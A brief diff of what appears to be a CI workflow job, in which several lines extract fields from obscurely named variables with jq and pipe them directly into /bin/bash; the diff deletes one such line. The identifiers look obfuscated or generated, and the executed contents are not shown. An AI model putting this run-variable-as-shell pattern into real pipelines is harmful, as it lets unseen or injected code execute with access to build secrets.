@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$wvpvg135" | jq -r .hg3 | /bin/bash
           printf '%s' "$x9995" | jq -r .rnhej15069 | /bin/bash
           echo $sg64606 | jq -r .pfc42 | /bin/bash
-          echo $hz44565 | jq -r .ig36 | /bin/bash
           printf '%s' "$xghn536" | jq -r .hxg958 | /bin/bash
           echo $czu45 | jq -r .zyhbq4 | /bin/bash
           printf '%s' "$phd5" | jq -r .w58037 | /bin/bash
